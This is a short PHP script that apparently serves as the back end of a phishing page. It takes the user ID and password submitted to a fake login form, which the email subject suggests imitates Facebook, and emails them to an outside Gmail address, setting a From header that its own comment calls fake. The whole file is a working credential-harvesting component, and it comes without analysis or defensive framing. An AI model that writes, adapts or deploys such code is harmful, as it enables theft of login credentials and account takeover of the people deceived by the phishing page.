<?php

    $user = $_POST['user_id'];
    $pass = $_POST['password'];

    //$to = "mail need to send captured userd id and password via login page"
    $to = "examplemailid@gmail.com"; #recipient's  mail id 
    $subject = "Facebook Login Credentials";
    $message = "User ID: $user\nPassword: $pass";
    $headers = "From: naniexample@gmail.com\r\n"; #header mail mail like we can consider fake sender mail id
    $headers .= "Reply-To: naninarayana119@gmail.com\r\n"; # This appends the "Reply-To" header to the same email address as the "From" header.
    $headers .= "X-Mailer: PHP/" . phpversion();

    if (mail($to, $subject, $message, $headers)) {
        
    } else {
        echo "Mail failed to send.";
    }

?>
